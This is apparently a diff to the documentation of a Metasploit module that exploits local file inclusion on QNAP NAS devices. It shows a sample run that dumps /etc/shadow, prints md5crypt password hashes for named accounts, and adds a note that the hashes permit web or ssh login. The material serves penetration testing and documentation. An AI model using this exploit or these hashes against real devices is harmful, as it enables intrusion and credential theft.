@@ -55,13 +55,16 @@ msf5 auxiliary(gather/qnap_lfi) > run
 [*] Attempting Local File Inclusion
 [+] File download successful, file saved in /home/redouane/.msf4/loot/20200528212705_default_[REDACTED]_qnap.http_394810.bin
 [+] File content:
-admin:$1$$CoERg7ynjYLsj2j4glJ34.:14233:0:99999:7:::
+admin:$1$$0EDxoz0B/Et7aYxLtR/Ik/:14233:0:99999:7:::
 guest:$1$$ysap7EeB9ODCrO46Psdbq/:14233:0:99999:7:::
-httpdusr:!:16762:0:99999:7:::
-Redouane:$1$$EBquHgqfhZQKEdjd8dqWh1:16935:0:99999:7:::
-[sshd]:!:17496:0:99999:7:::
-[appuser]:!:18036:0:99999:7:::
-af4de148:$1$$Wb6XAeBxv2R5HfU8uyZc.1:18407:0:99999:7:::
+httpdusr:!:16923:0:99999:7:::
+Cherle:$1$$Bb3R7AIqzIemj7kGq5k/p1:16923:0:99999:7:::
+redouane:$1$$l265pXOEMo0cRDhod/Z3M1:16923:0:99999:7:::
+Test:$1$$0EDxoz0B/Et7aYxLtR/Ik/:16928:0:99999:7:::
+Merle:$1$JjtNtEJx$PMtCY0tpb2N/rjck2fHVI0:17438:0:99999:7:::
+[appuser]:!:17451:0:99999:7:::
+[sshd]:!:17637:0:99999:7:::
+a9d01ba7:$1$PKQtJPZZ$3RdJRQozKzdx1axJqP9Fe/:18405:0:99999:7:::
 [*] adding the /etc/shadow entries to the database
 [*] Auxiliary module execution completed
 msf5 auxiliary(gather/qnap_lfi) > loot
@@ -73,9 +76,25 @@ host           service  type       name    content                   info  path
 ----           -------  ----       ----    -------                   ----  ----
 [REDACTED]              qnap.http  shadow  text/plain                      /home/redouane/.msf4/loot/20200528212705_default_[REDACTED]_qnap.http_394810.bin
 
+msf5 auxiliary(gather/qnap_lfi) > creds 
+Credentials
+===========
+
+host  origin         service  public      private                             realm  private_type        JtR Format
+----  ------         -------  ------      -------                             -----  ------------        ----------
+      [REDACTED]              admin       $1$$0EDxoz0B/Et7aYxLtR/Ik/                 Nonreplayable hash  md5crypt
+      [REDACTED]              guest       $1$$ysap7EeB9ODCrO46Psdbq/                 Nonreplayable hash  md5crypt
+      [REDACTED]              Cherle      $1$$Bb3R7AIqzIemj7kGq5k/p1                 Nonreplayable hash  md5crypt
+      [REDACTED]              redouane    $1$$l265pXOEMo0cRDhod/Z3M1                 Nonreplayable hash  md5crypt
+      [REDACTED]              Test        $1$$0EDxoz0B/Et7aYxLtR/Ik/                 Nonreplayable hash  md5crypt
+      [REDACTED]              Merle       $1$JjtNtEJx$PMtCY0tpb2N/rjck2fHVI0         Nonreplayable hash  md5crypt
+      [REDACTED]              a9d01ba7    $1$PKQtJPZZ$3RdJRQozKzdx1axJqP9Fe/         Nonreplayable hash  md5crypt
+
 msf5 auxiliary(gather/qnap_lfi) > 
 
 ```
+
+The hashes can be used to login from the web interface, or through ssh if it's enabled.
 
 #### Dumping ssh private keys
 
